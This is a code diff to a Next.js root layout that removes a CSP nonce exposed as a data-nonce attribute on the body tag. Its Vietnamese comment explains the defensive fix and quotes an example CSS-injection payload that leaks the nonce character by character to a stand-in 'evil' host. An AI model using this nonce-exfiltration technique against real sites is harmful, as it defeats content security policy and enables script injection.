@@ -46,6 +46,19 @@ const beVietnamPro = Be_Vietnam_Pro({
  * `THEME_INIT_SCRIPT` (D2/C1, `packages/ui`) đặt class `dark` trên `<html>`
  * TRƯỚC PAINT — phải nằm trong `<head>`, mang CÙNG nonce, và chạy TRƯỚC khi
  * React hydrate `<body>` để không nháy màu (FOUC) giữa theme sáng/tối.
+ *
+ * ⛔ S3 — KHÔNG BAO GIỜ in nonce ra một thuộc tính DOM (`<body data-nonce={nonce}>`
+ * từng ở đây). Nonce chỉ có giá trị khi kẻ tấn công KHÔNG đọc được nó; in ra DOM
+ * là tự tay huỷ tính chất đó. Cụ thể: CSP của ta còn `style-src 'unsafe-inline'`,
+ * nên một lỗ chèn HTML **không cần script** vẫn nhét được
+ * `<style>body[data-nonce^="a"]{background:url(https://evil/a)}…</style>` và dò
+ * từng ký tự nonce qua các request ảnh — rồi chèn `<script nonce=…>` hợp lệ, mà
+ * `'strict-dynamic'` sẽ cho script đó nạp tiếp bất cứ gì.
+ *
+ * Script inline vẫn nhận nonce qua thuộc tính `nonce` THẬT ở dưới — trình duyệt
+ * che giá trị đó khỏi `getAttribute` sau khi phân tích xong, nên nó không dò
+ * được như `data-*`. Cần kiểm nonce trong test thì đọc HTML THÔ của response
+ * (`e2e/csp.spec.ts` làm đúng vậy), đừng đọc DOM.
  */
 export default async function RootLayout({ children }: { children: ReactNode }) {
   const requestHeaders = await headers();
@@ -80,7 +93,7 @@ export default async function RootLayout({ children }: { children: ReactNode }) 
       <head>
         <script nonce={nonce} dangerouslySetInnerHTML={{ __html: THEME_INIT_SCRIPT }} />
       </head>
-      <body className="min-h-screen bg-background text-foreground antialiased" data-nonce={nonce}>
+      <body className="min-h-screen bg-background text-foreground antialiased">
         <ThemeProvider>
           <TooltipProvider delayDuration={300}>
             <AppShell viewer={viewer}>{children}</AppShell>
